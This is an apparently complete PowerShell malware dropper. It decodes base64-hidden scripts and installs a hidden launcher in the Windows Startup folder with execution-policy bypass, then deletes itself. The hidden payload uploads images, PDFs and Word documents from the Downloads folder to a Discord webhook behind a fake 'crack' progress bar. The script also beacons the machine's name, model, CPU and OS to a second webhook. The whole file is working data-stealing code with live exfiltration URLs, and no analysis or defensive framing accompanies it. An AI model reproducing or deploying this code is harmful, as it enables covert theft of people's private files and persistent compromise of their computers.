# Paths
$tempFolder = $env:TEMP
$selfPath = $MyInvocation.MyCommand.Path
$camPsPath = Join-Path $tempFolder "cam.ps1"
$launcherBatPath = Join-Path $tempFolder "launcher.bat"
$startupFolder = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\launcher.bat"

# Base64 payloads
$base64Cam = "JERvd25sb2Fkc1BhdGggPSAiJGVudjpVU0VSUFJPRklMRVxEb3dubG9hZHMiCiRXZWJob29rVVJMID0gImh0dHBzOi8vZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzE0NDIxMTc4NjE3MTQ5NTIyNTQvSFNqMHppd0xyMGpDcnFRNHdBbWNlWF81ZGhzeTlXcUotcEhRMmQzT2cyc2lmcHI4dXJZODVBRkpGQl92aTJ6UG5ibVUiCiRNYXhGaWxlU2l6ZU1CID0gOAokSW1hZ2VFeHRlbnNpb25zID0gQCgiLmpwZyIsICIuanBlZyIsICIucG5nIiwgIi5wZGYiLCAiLmRvY3giKQokTG9nRmlsZSA9ICIkZW52OlRFTVBcdXBsb2FkZWRfZmlsZXMubG9nIgoKU3RhcnQtU2xlZXAgLVNlY29uZHMgMgoKIyBDcmVhdGUgbG9nIGZpbGUgaWYgaXQgZG9lc24ndCBleGlzdAppZiAoLW5vdCAoVGVzdC1QYXRoICRMb2dGaWxlKSkgewogICAgTmV3LUl0ZW0gLVBhdGggJExvZ0ZpbGUgLUl0ZW1UeXBlIEZpbGUgfCBPdXQtTnVsbAp9CgojIFJlYWQgcHJldmlvdXNseSB1cGxvYWRlZCBmaWxlcwokVXBsb2FkZWRGaWxlcyA9IEB7fQpHZXQtQ29udGVudCAkTG9nRmlsZSB8IEZvckVhY2gtT2JqZWN0IHsKICAgICRwYXJ0cyA9ICRfIC1zcGxpdCAiXHwiCiAgICBpZiAoJHBhcnRzLkxlbmd0aCAtZXEgMykgewogICAgICAgICRVcGxvYWRlZEZpbGVzWyIkKCRwYXJ0c1swXSl8JCgkcGFydHNbMV0pfCQoJHBhcnRzWzJdKSJdID0gJHRydWUKICAgIH0KfQoKZnVuY3Rpb24gVXBsb2FkLUZpbGVUb0Rpc2NvcmQgewogICAgcGFyYW0gKAogICAgICAgIFtzdHJpbmddJEZpbGVQYXRoLAogICAgICAgIFtzdHJpbmddJFdlYmhvb2tVUkwKICAgICkKCiAgICAkQm91bmRhcnkgPSBbU3lzdGVtLkd1aWRdOjpOZXdHdWlkKCkuVG9TdHJpbmcoKQogICAgJExGID0gImByYG4iCiAgICAkQ29udGVudCA9ICItLSRCb3VuZGFyeSRMRiIKICAgICRDb250ZW50ICs9ICdDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9ImZpbGUiOyBmaWxlbmFtZT0iJyArIFtTeXN0ZW0uSU8uUGF0aF06OkdldEZpbGVOYW1lKCRGaWxlUGF0aCkgKyAnIicgKyAkTEYKICAgICRDb250ZW50ICs9ICdDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL29jdGV0LXN0cmVhbScgKyAkTEYgKyAkTEYKICAgICRGaWxlQnl0ZXMgPSBbU3lzdGVtLklPLkZpbGVdOjpSZWFkQWxsQnl0ZXMoJEZpbGVQYXRoKQogICAgJENvbnRlbnRCeXRlcyA9IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OkFTQ0lJLkdldEJ5dGVzKCRDb250ZW50KQogICAgJEVuZGluZ0J5dGVzID0gW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6QVNDSUkuR2V0Qnl0ZXMoIiRMRi0tJEJvdW5kYXJ5LS0kTEYiKQogICAgJEFsbEJ5dGVzID0gJENvbnRlbnRCeXRlcyArICRGaWxlQnl0ZXMgKyAkRW5kaW5nQnl0ZXMKCiAgICAkV2ViQ2xpZW50ID0gTmV3LU9iamVjdCBTeXN0ZW0uTmV0LldlYkNsaWVudAogICAgJFdlYkNsaWVudC5IZWFkZXJzLkFkZCgiQ29udGVudC1UeXBlIiwgIm11bHRpcGFydC9mb3JtLWRhdGE7IGJvdW5kYXJ5PSRCb3VuZGFyeSIpCiAgICB0cnkgewogICAgICAgICRXZWJDbGllbnQuVXBsb2FkRGF0YSgkV2ViaG9va1VSTCwgJEFsbEJ5dGVzKSB8IE91dC1OdWxsCiAgICB9CiAgICBjYXRjaCB7IH0KfQoKJEZpbGVzID0gR2V0LUNoaWxkSXRlbSAtUGF0aCAkRG93bmxvYWRzUGF0aCAtRmlsZSB8IFdoZXJlLU9iamVjdCB7ICRJbWFnZUV4dGVuc2lvbnMgLWNvbnRhaW5zICRfLkV4dGVuc2lvbi5Ub0xvd2VyKCkgfQokVG90YWxGaWxlcyA9ICRGaWxlcy5Db3VudAppZiAoJFRvdGFsRmlsZXMgLWVxIDApIHsKICAgIGV4aXQKfQoKJEN1cnJlbnRGaWxlID0gMAoKZm9yZWFjaCAoJEZpbGUgaW4gJEZpbGVzKSB7CiAgICAkQ3VycmVudEZpbGUrKwogICAgJEZpbGVTaXplTUIgPSBbbWF0aF06OlJvdW5kKCRGaWxlLkxlbmd0aCAvIDFNQiwgMikKICAgICRGaWxlS2V5ID0gIiQoJEZpbGUuTmFtZSl8JCgkRmlsZVNpemVNQil8JCgkRmlsZS5MYXN0V3JpdGVUaW1lVXRjKSIKCiAgICAjIFNraXAgaWYgYWxyZWFkeSB1cGxvYWRlZAogICAgaWYgKCRVcGxvYWRlZEZpbGVzLkNvbnRhaW5zS2V5KCRGaWxlS2V5KSkgewogICAgICAgIAogICAgICAgIGNvbnRpbnVlCiAgICB9CgogICAgaWYgKCRGaWxlU2l6ZU1CIC1sZSAkTWF4RmlsZVNpemVNQikgewogICAgICAgICMgUHJvZ3Jlc3MgZWZmZWN0CiAgICAgICAgZm9yICgkaSA9IDE7ICRpIC1sZSAxMDA7ICRpICs9IDUpIHsKICAgICAgICAgICAgJFBlcmNlbnQgPSAiezA6TjB9IiAtZiAkaQogICAgICAgICAgICBXcml0ZS1Ib3N0ICgiTG9hZGluZzogezB9L3sxfTogW3syfXszfV0gezR9JSIgLWYgJEN1cnJlbnRGaWxlLCAkVG90YWxGaWxlcywgKCIjIiAqICgkaSAvIDUpKSwgKCIgIiAqICgoMTAwIC0gJGkpIC8gNSkpLCAkUGVyY2VudCkgLU5vTmV3bGluZQogICAgICAgICAgICBTdGFydC1TbGVlcCAtTWlsbGlzZWNvbmRzIDUwCiAgICAgICAgICAgIFdyaXRlLUhvc3QgImByIiAtTm9OZXdsaW5lCiAgICAgICAgfQoKICAgICAgICBVcGxvYWQtRmlsZVRvRGlzY29yZCAtRmlsZVBhdGggJEZpbGUuRnVsbE5hbWUgLVdlYmhvb2tVUkwgJFdlYmhvb2tVUkwKCiAgICAgICAgIyBMb2cgdGhlIGZpbGUgbWV0YWRhdGEKICAgICAgICAiJCgkRmlsZS5OYW1lKXwkKCRGaWxlU2l6ZU1CKXwkKCRGaWxlLkxhc3RXcml0ZVRpbWVVdGMpIiB8IE91dC1GaWxlIC1GaWxlUGF0aCAkTG9nRmlsZSAtQXBwZW5kCiAgICB9Cn0KCldyaXRlLUhvc3QgImBuQ3JhY2sgc3VjY2Vzc2Z1bGx5IGRvbmUhIgo"
$base64Launcher = "QGVjaG8gb2ZmDQo6OiBHZXQgVGVtcCBmb2xkZXINCnNldCBURU1QX0ZPTERFUj0lVEVNUCUNCnNldCBDQU1fUFMxPSVURU1QX0ZPTERFUiVcY2FtLnBzMQ0KDQo6OiBDaGVjayBpZiBjYW0ucHMxIGV4aXN0cw0KaWYgZXhpc3QgIiVDQU1fUFMxJSIgKA0KICAgIDo6IFJ1biBjYW0ucHMxIGhpZGRlbiwgbm8gcHJvZmlsZSwgYnlwYXNzIGV4ZWN1dGlvbiBwb2xpY3kNCiAgICBwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLVdpbmRvd1N0eWxlIEhpZGRlbiAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSAiJUNBTV9QUzElIg0KKSBlbHNlICgNCiAgICBlY2hvIGNhbS5wczEgbm90IGZvdW5kIGluICVURU1QX0ZPTERFUiUNCikNCg0KZXhpdA0K"


# Decode cam.ps1
$camBytes = [Convert]::FromBase64String($base64Cam)
$camDecoded = [System.Text.Encoding]::UTF8.GetString($camBytes)
Set-Content -Path $camPsPath -Value $camDecoded -Encoding UTF8

# Decode launcher.bat
$launcherBytes = [Convert]::FromBase64String($base64Launcher)
$launcherDecoded = [System.Text.Encoding]::UTF8.GetString($launcherBytes)
Set-Content -Path $launcherBatPath -Value $launcherDecoded -Encoding UTF8

# Copy launcher.bat to startup if not exists
if (-not (Test-Path $startupFolder)) {
    Copy-Item -Path $launcherBatPath -Destination $startupFolder -Force
}

# Optional self delete after setup
Start-Process cmd "/c ping 127.0.0.1 -n 2 > nul & del `"$selfPath`"" -WindowStyle Hidden

# Collect info
$computer = $env:COMPUTERNAME
$cs = Get-CimInstance Win32_ComputerSystem
$model = ($cs.Model).Trim()
$cpu = (Get-CimInstance Win32_Processor).Name
$osObj = Get-CimInstance Win32_OperatingSystem
$osCaption = ($osObj.Caption).Trim()
$date = (Get-Date).ToUniversalTime().AddHours(8).ToString("MMM dd, yyyy hh:mm tt")

# Build laptop info string
$laptopinfo = "$computer $model $cpu $osCaption $date"

# Discord webhook URL
$webhook = "https://discord.com/api/webhooks/1441783360811958476/1IThfCMPctJOvRhI_7NKT6GLBDiaZHsuNMaV9WaodOZOz3ygYUbAKlIomsnkqW_i_7C_"

# Payload
$payload = @{
    content = "The Bomb has been planted in $laptopinfo"
} | ConvertTo-Json

# Send to Discord
Invoke-RestMethod -Uri $webhook -Method Post -Body $payload -ContentType "application/json"

